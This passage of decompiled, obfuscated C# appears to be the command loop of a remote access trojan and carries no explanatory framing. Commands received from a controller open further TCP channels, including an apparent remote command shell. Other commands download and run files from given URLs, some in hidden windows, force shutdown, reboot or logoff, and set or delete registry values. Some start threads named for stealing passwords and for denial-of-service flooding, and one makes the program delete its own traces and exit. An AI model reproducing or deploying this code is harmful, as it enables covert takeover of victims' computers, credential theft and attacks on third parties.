							fvOjRF7zya141 = new StreamReader(Ye489UmR3D139);
							streamWriter_4 = new StreamWriter(Ye489UmR3D139);
							gYDDNai7OR142 = new Thread(Ju08fsT0xE9GW207);
							gYDDNai7OR142.Start();
							streamWriter_4.WriteLine("/TRYSERVV/");
							streamWriter_4.Flush();
							continue;
						case "/TRYTRYOW/":
							J2f1UtolJ4143 = new TcpClient();
							J2f1UtolJ4143.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							ueYUQtpKht144 = J2f1UtolJ4143.GetStream();
							ZQItWcfNoo146 = new StreamReader(ueYUQtpKht144);
							NNjSn6u2cc145 = new StreamWriter(ueYUQtpKht144);
							hLQtG2ZJNk147 = new Thread(mb32cxoqJvDeA208);
							hLQtG2ZJNk147.Start();
							NNjSn6u2cc145.WriteLine("/TRYOWWWW/");
							NNjSn6u2cc145.Flush();
							continue;
						case "/TRYTRYRG/":
							KxQl4WImEO148 = new TcpClient();
							KxQl4WImEO148.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							Zl9w5DvvXD149 = KxQl4WImEO148.GetStream();
							streamReader_3 = new StreamReader(Zl9w5DvvXD149);
							dClTc2WPck150 = new StreamWriter(Zl9w5DvvXD149);
							tS8AoWCjo2152 = new Thread(f2oH4wWtfeHOC209);
							tS8AoWCjo2152.Start();
							dClTc2WPck150.WriteLine("/TRYREGGG/");
							dClTc2WPck150.Flush();
							continue;
						case "/TRYTRYCM/":
							wtMa67cW81153 = new TcpClient();
							wtMa67cW81153.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							ZTajHe6g4D154 = wtMa67cW81153.GetStream();
							qDraNDX4Lk156 = new StreamReader(ZTajHe6g4D154);
							D75W9ktLug155 = new StreamWriter(ZTajHe6g4D154);
							f3en0AIOTa157 = new Thread(QKcuHE0oDvcah210);
							f3en0AIOTa157.Start();
							D75W9ktLug155.WriteLine("/TRYCMDDD/");
							D75W9ktLug155.Flush();
							continue;
						case "/REMOVESV/":
							try
							{
								string text9 = Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: false)!.GetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.NaBwasDQqC3gtkNevzzE7c42(), "12345#$%")));
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(text9);
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: true)!.DeleteValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.NaBwasDQqC3gtkNevzzE7c42(), "12345#$%"));
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							try
							{
								string text10 = Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: false)!.GetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.HqG59liI1fizmuC4kEX6jO43(), "12345#$%")));
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(text10);
							}
							catch (Exception projectError29)
							{
								ProjectData.SetProjectError(projectError29);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: true)!.DeleteValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.HqG59liI1fizmuC4kEX6jO43(), "12345#$%"));
							}
							catch (Exception projectError30)
							{
								ProjectData.SetProjectError(projectError30);
								ProjectData.ClearProjectError();
							}
							try
							{
								string executablePath = Application.get_ExecutablePath();
								string text11 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
								_ = text11 + "\\" + Path.GetFileName(executablePath);
								foreach (string file in ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFiles(text11))
								{
									try
									{
										if (((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFileInfo(file).Length > 100000L)
										{
											((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(file);
										}
									}
									catch (Exception projectError31)
									{
										ProjectData.SetProjectError(projectError31);
										ProjectData.ClearProjectError();
									}
								}
							}
							catch (Exception projectError32)
							{
								ProjectData.SetProjectError(projectError32);
								ProjectData.ClearProjectError();
							}
							try
							{
								Environment.Exit(0);
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								Environment.Exit(0);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNVS/":
							try
							{
								List<string> list2 = new List<string>();
								string[] array6 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array7 = array6;
								foreach (string item2 in array7)
								{
									list2.Add(item2);
								}
								int index2 = list2.Count - 1;
								string text7 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array8 = list2[index2].ToString().Split(new char[1] { '.' });
								string text8 = null;
								text8 = ((!((Operators.CompareString(array8[array8.Length - 1], "swf", false) == 0) | (Operators.CompareString(array8[array8.Length - 1], "SWF", false) == 0))) ? array8[array8.Length - 1] : "exe");
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Network().DownloadFile(text7, Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8, (string)null, (string)null, false, 100000, true);
								GmhWc9n87GxDM122(1);
								Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8);
							}
							catch (Exception projectError26)
							{
								ProjectData.SetProjectError(projectError26);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNHD/":
							try
							{
								List<string> list = new List<string>();
								string[] array3 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array4 = array3;
								foreach (string item in array4)
								{
									list.Add(item);
								}
								int index = list.Count - 1;
								string text5 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array5 = list[index].ToString().Split(new char[1] { '.' });
								string text6 = null;
								text6 = ((!((Operators.CompareString(array5[array5.Length - 1], "swf", false) == 0) | (Operators.CompareString(array5[array5.Length - 1], "SWF", false) == 0))) ? array5[array5.Length - 1] : "exe");
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Network().DownloadFile(text5, Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6, (string)null, (string)null, false, 100000, true);
								GmhWc9n87GxDM122(1);
								Process process = new Process();
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6;
								process.Start();
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RESTWIND/":
							try
							{
								Interaction.Shell("shutdown -r /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/TURNWIND/":
							try
							{
								Interaction.Shell("shutdown -s /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError23)
							{
								ProjectData.SetProjectError(projectError23);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/LOGOWIND/":
							try
							{
								Interaction.Shell("shutdown -l /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError22)
							{
								ProjectData.SetProjectError(projectError22);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/MEUPDATE/":
							continue;
						case "/BACKUPUP/":
							continue;
						case "/INSTALLK/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread7 = new Thread(d1AseIpuSifgv181);
								thread7.Start(text4);
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/UPANDRUN/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread6 = new Thread(MdwKpW1MXbD1i160);
								thread6.Start(text4);
							}
							catch (Exception projectError20)
							{
								ProjectData.SetProjectError(projectError20);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread5 = new Thread(czM1AAAL6kdAo155);
								thread5.Start(text4);
							}
							catch (Exception projectError19)
							{
								ProjectData.SetProjectError(projectError19);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/PASSALLL/":
							try
							{
								Thread thread4 = new Thread(QP3c4dJhzFuHt156);
								thread4.Start();
							}
							catch (Exception projectError18)
							{
								ProjectData.SetProjectError(projectError18);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/OPENWEBB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread3 = new Thread(UykJprmS5q6ah157);
								thread3.Start(text4);
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWS/":
							try
							{
								Thread thread2 = new Thread(fxExmhZNbJtxh158);
								thread2.Start();
							}
							catch (Exception projectError16)
							{
								ProjectData.SetProjectError(projectError16);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/AVAILABL/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread = new Thread(KweDTik6G2qmU159);
								thread.Start(text4);
							}
							catch (Exception projectError15)
							{
								ProjectData.SetProjectError(projectError15);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RETURNSX/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								try
								{
									try
									{
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)text4, false))))
										{
											((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text4, RegistryValueKind.String);
										}
									}
									catch (Exception projectError12)
									{
										ProjectData.SetProjectError(projectError12);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError14)
							{
								ProjectData.SetProjectError(projectError14);
								ProjectData.ClearProjectError();
							}
							continue;
						}
						GmhWc9n87GxDM122(5);
						DzFXXg4YmA4gT15++;
						if (DzFXXg4YmA4gT15 <= 5)
						{
							continue;
						}
						try
						{
							OwUfdzNu4aWsv30.WriteLine("test");
							OwUfdzNu4aWsv30.Flush();
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							try
							{
								if (!Pv0OZhJLXDYOZ28.Connected)
								{
									ProjectData.ClearProjectError();
									break;
								}
							}
							catch (Exception projectError35)
							{
								ProjectData.SetProjectError(projectError35);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					method_4();
					Thread.Sleep(100);
				}
				catch (Exception projectError37)
				{
					ProjectData.SetProjectError(projectError37);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
